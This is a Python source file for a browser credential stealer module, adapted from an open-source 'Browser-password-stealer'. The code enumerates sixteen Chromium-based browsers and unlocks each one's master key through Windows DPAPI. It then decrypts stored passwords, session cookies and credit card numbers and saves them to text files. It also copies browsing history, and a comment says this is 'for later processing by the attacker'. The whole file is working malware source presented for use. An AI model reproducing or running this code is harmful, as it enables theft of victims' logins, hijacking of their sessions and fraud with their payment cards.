"""
This is a modified and improved version of:
    https://github.com/henry-richard7/Browser-password-stealer/blob/master/chromium_based_browsers.py

--------------------------------------------------------------------------------------
MIT License

Copyright (c) 2020 Henry Richard J

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
--------------------------------------------------------------------------------------
"""


import base64
import json
import os
import shutil
import sqlite3
from datetime import datetime

from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

from config import Constant
from config import ModuleManager


class ChromiumRecovery(ModuleManager):

    def __init__(self) -> None:
        super().__init__(module_name="ChromiumStealer")

        self.banner(r"""
     _______         _______ _                      _             
    |.-----.|       (_______) |                    (_)            
    ||x . x||        _      | |__   ____ ___  ____  _ _   _ ____  
    ||_.-._||       | |     |  _ \ / ___) _ \|    \| | | | |    \ 
    `--)-(--`       | |_____| | | | |  | |_| | | | | | |_| | | | |
   __[=== o]___      \______)_| |_|_|   \___/|_|_|_|_|____/|_|_|_|
  |:::::::::::|\    
  `-=========-`()        Passwords + Cookies + Cards + Other
              """)

        self.browsers_folder = os.path.join(
            self.output_folder_user, 'browsers')

        appdata = os.getenv('LOCALAPPDATA')
        self.browsers = {
            'amigo': appdata + '\\Amigo\\User Data',
            'torch': appdata + '\\Torch\\User Data',
            'kometa': appdata + '\\Kometa\\User Data',
            'orbitum': appdata + '\\Orbitum\\User Data',
            'cent-browser': appdata + '\\CentBrowser\\User Data',
            '7star': appdata + '\\7Star\\7Star\\User Data',
            'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
            'uran': appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': appdata + '\\Iridium\\User Data',
        }

    def __get_master_key(self, browser_path: str, browser_name: str = None) -> bytes:
        if not os.path.exists(browser_path):
            return
        filename = browser_path + "\\Local State"
        with open(filename, "r", encoding="utf-8") as f:
            c = f.read()
            if 'os_crypt' not in c:
                self.merror(
                    f"Unable to get master key for {browser_name} Browser, 'os_crypt' is cannot be found in {filename}")
                return

            local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        self.mdebug(
            f"Got Master Key for {browser_name} Browser at PATH: {browser_path}")
        return master_key

    def __decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def save_results(self, browser_name, data_type, content, profile) -> None:
        save_path = os.path.join(self.browsers_folder, browser_name, profile)

        if not os.path.isdir(save_path):
            os.makedirs(save_path)
            self.mdebug(
                f"[{browser_name}] [{profile}] [{data_type}] Created folder at {save_path}")

        filename = os.path.join(save_path, f'{data_type}.txt')

        if content:
            with open(filename, 'w', encoding='utf-8') as file:
                file.write(content)
                self.mprint(
                    f"[{browser_name}] [{profile}] [{data_type}] Saved content to {filename}")
        else:
            self.mdebug(
                f"[{browser_name}] [{profile}] [{data_type}] No data found in {data_type}")

        if not os.listdir(save_path):
            os.rmdir(save_path)
            self.mdebug(
                f"[{browser_name}] [{profile}] [{data_type}] Removing empty folder as no data was found: {save_path}")

    def __get_login_data(self, path: str, profile: str, master_key: bytes, browser_name: str) -> str:
        result = ""
        login_db = f'{path}\\{profile}\\Login Data'
        copy_path = os.path.join(self.browsers_folder, browser_name, profile)

        if not os.path.exists(login_db):
            self.mdebug(
                f"[{browser_name}] [{profile}] [passwords] Login data doesn't exist at {login_db}")
            return

        if not os.path.isdir(copy_path):
            os.makedirs(copy_path)
            self.mdebug(
                f"[{browser_name}] [{profile}] [passwords] Created folder at {copy_path}")

        copy_path = os.path.join(copy_path, 'login.db')
        if os.path.isfile(copy_path):
            os.remove(copy_path)
            self.mdebug(
                f"[{browser_name}] [{profile}] [passwords] Removing 'login.db' that already exists at {copy_path}")

        try:
            shutil.copy(login_db, copy_path)
        except Exception as e:
            self.merror(
                f"[{browser_name}] [{profile}] [passwords] Unable to copy {login_db} to {copy_path} -> {e}")
            return "Error. Please check the Log"

        conn = sqlite3.connect(copy_path)
        cursor = conn.cursor()
        cursor.execute(
            'SELECT action_url, username_value, password_value FROM logins')

        self.mdebug(
            f"[{browser_name}] [{profile}] [passwords] Connected to copied 'login.db' and ran the query ")

        for row in cursor.fetchall():
            try:
                password = self.__decrypt_password(row[2], master_key)
            except Exception as e:
                self.merror(
                    f"[{browser_name}] [{profile}] [passwords] Error in decrypting the password for {row[1]} -> {row[2]} -> {e}")
                password = "Error. Check the log"
            result += f"""\nURL: {row[0]}\nEmail: {row[1]}\nPassword: {password}"""
            result += Constant.seperator

        conn.close()
        self.mdebug(
            f"[{browser_name}] [{profile}] [passwords] Closing Database Connection and Returning fetched data ")
        return result

    def __get_credit_cards(self, path: str, profile: str, master_key: bytes, browser_name: str) -> str:
        result = ""
        cards_db = f'{path}\\{profile}\\Web Data'
        copy_path = os.path.join(self.browsers_folder, browser_name, profile)

        if not os.path.exists(cards_db):
            self.mdebug(
                f"[{browser_name}] [{profile}] [cards] Web data doesn't exist at {cards_db}")
            return

        if not os.path.isdir(copy_path):
            os.makedirs(copy_path)
            self.mdebug(
                f"[{browser_name}] [{profile}] [cards] Created folder at {copy_path}")

        copy_path = os.path.join(copy_path, 'cards.db')
        if os.path.isfile(copy_path):
            os.remove(copy_path)
            self.mdebug(
                f"[{browser_name}] [{profile}] [cards] Removing 'cards.db' that already exists at {copy_path}")

        try:
            shutil.copy(cards_db, copy_path)
        except Exception as e:
            self.merror(
                f"[{browser_name}] [{profile}] [cards] Unable to copy {cards_db} to {copy_path} -> {e}")
            return "Error. Please check the Log"

        conn = sqlite3.connect(copy_path)
        cursor = conn.cursor()
        cursor.execute(
            'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')

        self.mdebug(
            f"[{browser_name}] [{profile}] [cards] Connected to copied 'cards.db' and ran the query ")

        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue
            try:
                card_number = self.__decrypt_password(row[3], master_key)
            except Exception as e:
                self.merror(
                    f"[{browser_name}] [{profile}] [cards] Error in decrypting the Card Number for {row[0]} -> {row[3]} -> {e}")
                card_number = "Error. Check the log"
            result += f"""\nName On Card: {row[0]}\nCard Number: {card_number}\nExpires On:  {row[1]} / {row[2]}\nAdded On: {datetime.fromtimestamp(row[4])}"""
            result += Constant.seperator

        conn.close()
        self.mdebug(
            f"[{browser_name}] [{profile}] [cards] Closing Database Connection and Returning fetched data ")
        return result

    def __get_cookies(self, path: str, profile: str, master_key: bytes, browser_name: str) -> str:
        result = ""
        cookie_db = f'{path}\\{profile}\\Network\\Cookies'
        copy_path = os.path.join(self.browsers_folder, browser_name, profile)

        if not os.path.exists(cookie_db):
            self.mdebug(
                f"[{browser_name}] [{profile}] [cookies] Login data doesn't exist at {cookie_db}")
            return

        if not os.path.isdir(copy_path):
            os.makedirs(copy_path)
            self.mdebug(
                f"[{browser_name}] [{profile}] [cookies] Created folder at {copy_path}")

        copy_path = os.path.join(copy_path, 'cookies.db')
        if os.path.isfile(copy_path):
            os.remove(copy_path)
            self.mdebug(
                f"[{browser_name}] [{profile}] [cookies] Removing 'cookies.db' that already exists at {copy_path}")

        try:
            shutil.copy(cookie_db, copy_path)
        except Exception as e:
            self.merror(
                f"[{browser_name}] [{profile}] [cookies] Unable to copy {cookie_db} to {copy_path} -> {e}")
            return "Error. Please check the Log"

        conn = sqlite3.connect(copy_path)
        cursor = conn.cursor()
        cursor.execute(
            'SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')

        self.mdebug(
            f"[{browser_name}] [{profile}] [cookies] Connected to copied 'cookies.db' and ran the query ")

        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue

            try:
                cookie = self.__decrypt_password(row[3], master_key)
            except Exception as e:
                self.merror(
                    f"[{browser_name}] [{profile}] [cookies] Error in decrypting the cookies for {row[1]} -> {row[3]} -> {e}")
                cookie = "Error. Check the log"

            result += f"""\nHost Key : {row[0]}\nCookie Name : {row[1]}\nPath: {row[2]}\nCookie: {cookie}\nExpires On: {row[4]}"""
            result += Constant.seperator

        conn.close()
        self.mdebug(
            f"[{browser_name}] [{profile}] [cookies] Closing Database Connection and Returning fetched data ")
        return result

    def __get_web_history(self, path: str, profile: str, browser_name: str) -> str:
        result = ""
        web_history_db = f'{path}\\{profile}\\History'
        copy_path = os.path.join(self.browsers_folder, browser_name, profile)

        if not os.path.exists(web_history_db):
            self.mdebug(
                f"[{browser_name}] [{profile}] [history] Hisory data doesn't exist at {web_history_db}")
            return

        if not os.path.isdir(copy_path):
            os.makedirs(copy_path)
            self.mdebug(
                f"[{browser_name}] [{profile}] [history] Created folder at {copy_path}")

        copy_path = os.path.join(copy_path, 'history.db')
        if os.path.isfile(copy_path):
            os.remove(copy_path)
            self.mdebug(
                f"[{browser_name}] [{profile}] [passwords] Removing 'history.db' that already exists at {copy_path}")

        try:
            shutil.copy(web_history_db, copy_path)
        except Exception as e:
            self.merror(
                f"[{browser_name}] [{profile}] [passwords] Unable to copy {web_history_db} to {copy_path} -> {e}")
            return "Error. Please check the Log"

        # ????????????? NOTE ?????????????
        # If you wish to process history and then save this old way
        # Which is very slow, uncomment this code
        # This function only copies the DB for later processing by the attacker
        # as it is very fast

        # -----------
        # conn = sqlite3.connect(copy_path)
        # cursor = conn.cursor()
        # cursor.execute('SELECT url, title, last_visit_time FROM urls')

        # for row in cursor.fetchall():
        #     if not row[0] or not row[1] or not row[2]:
        #         continue
        #     result += f"""\nURL: {row[0]}\nTitle: {row[1]}\nVisited Time: {row[2]}"""

        # conn.close()
        # -----------

        return result

    def installed_chromium_browsers(self):
        results = []
        for browser, path in self.browsers.items():
            if os.path.exists(path):
                results.append(browser)
                self.mprint(f"Found {browser} Browser at {path}")
        return results

    def run(self):
        profiles = ["Default"]
        stuff = range(1, 11)
        for i in stuff:
            profiles.append("Profile {number}".format(number=i))
        self.mdebug(f"Looking for {len(stuff)} Profiles for each browser")

        available_browsers = self.installed_chromium_browsers()

        for browser in available_browsers:
            browser_path = self.browsers[browser]
            master_key = self.__get_master_key(
                browser_path=browser_path, browser_name=browser)

            for profile in profiles:
                self.save_results(
                    browser, 'login',
                    self.__get_login_data(
                        path=browser_path,
                        profile=profile,
                        master_key=master_key,
                        browser_name=browser
                    ), profile
                )

                self.save_results(
                    browser, 'cookies',
                    self.__get_cookies(
                        path=browser_path,
                        profile=profile,
                        master_key=master_key,
                        browser_name=browser
                    ), profile
                )

                self.save_results(
                    browser, 'cards',
                    self.__get_credit_cards(
                        path=browser_path,
                        profile=profile,
                        master_key=master_key,
                        browser_name=browser
                    ), profile
                )

                self.__get_web_history(
                    path=browser_path,
                    browser_name=browser,
                    profile=profile
                )

                # ????????????? NOTE ?????????????
                # If you wish to process history and then save this old way
                # Which is very slow, uncomment this code

                # -----------
                # self.save_results(
                #     browser, 'history',
                #     self.get_web_history(
                #         path=browser_path,
                #         browser_name=browser,
                #         profile=profile
                #     ), profile
                # )
                # -----------
